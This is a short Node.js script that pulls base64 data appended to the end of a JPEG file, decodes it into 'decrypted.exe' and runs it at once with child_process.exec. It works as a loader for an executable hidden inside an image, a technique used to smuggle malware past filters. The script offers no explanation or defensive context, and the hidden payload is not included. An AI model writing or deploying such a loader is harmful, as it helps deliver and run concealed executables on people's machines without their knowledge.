const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const imageFile = 'encrypted_image.jpg';
const outputFile = 'decrypted.exe';

const imageDataWithExe = fs.readFileSync(imageFile);
const base64EncodedData = imageDataWithExe.slice(imageDataWithExe.lastIndexOf('\n')+1).toString();
const decodedData = Buffer.from(base64EncodedData, 'base64');
fs.writeFileSync(outputFile, decodedData);
console.log(`The decrypted exe file ${outputFile} has been created.`);

exec(outputFile, (err, stdout, stderr) => {
    if (err) {
        console.error(err);
        return;
    }
    console.log(stdout);
});